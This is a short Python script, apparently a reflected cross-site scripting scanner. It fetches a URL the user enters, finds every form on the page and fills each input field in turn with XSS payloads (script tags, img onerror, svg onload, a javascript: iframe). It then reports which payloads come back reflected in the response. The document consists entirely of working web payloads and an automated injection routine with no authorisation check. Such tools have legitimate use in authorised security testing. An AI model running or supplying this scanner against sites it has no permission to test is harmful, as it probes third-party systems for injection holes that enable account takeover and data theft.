import requests
from bs4 import BeautifulSoup
payloads = ["<script>alert('XSS')</script>", "'\"><script>alert('Hacked')</script>",
            "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>", "<iframe src='javascript:alert(`XSS`)'>"]
def scan_post_xss(url):
    session = requests.Session()
    soup = BeautifulSoup(session.get(url).text, "lxml")
    forms = soup.find_all("form")
    for i, form in enumerate(forms, 1):
        form_url = form.get("action")
        form_url = form_url if form_url.startswith("http") else requests.compat.urljoin(url, form_url)
        method = form.get("method", "post").lower()
        inputs = {inp.get("name"): inp.get("value","") for inp in form.find_all("input")}
        print(f"\nForm {i} -> {method.upper()} {form_url}")
        for payload in payloads:
            for field in inputs:
                inputs[field] = payload
                res = session.post(form_url, data=inputs) if method=="post" else session.get(form_url, params=inputs)
                print(f"[!] XSS in form {i}, field '{field}': {payload}" if payload in res.text else f"[-] Not reflected in '{field}': {payload}")
url = input("Enter URL: ").strip()
scan_post_xss(url)
